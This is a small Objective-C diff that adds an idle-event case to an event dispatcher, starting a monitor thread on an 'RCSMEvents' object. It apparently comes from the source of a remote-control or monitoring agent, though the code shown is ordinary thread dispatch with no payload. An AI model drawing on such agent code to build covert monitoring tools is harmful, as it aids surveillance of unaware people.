@@ -3197,6 +3197,17 @@ static NSLock *gSyncLock                  = nil;
                                    withObject: anObject];
           }
           break;
+        case EVENT_IDLE:
+          {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"EVENT idle FOUND! Starting monitor Thread");
+#endif
+            RCSMEvents *events = [RCSMEvents sharedEvents];
+            [NSThread detachNewThreadSelector: @selector(eventIdle:)
+                                     toTarget: events
+                                   withObject: anObject];
+            break;
+          }
         default:
 #ifdef DEBUG_TASK_MANAGER
           infoLog(@"Event not implemented");
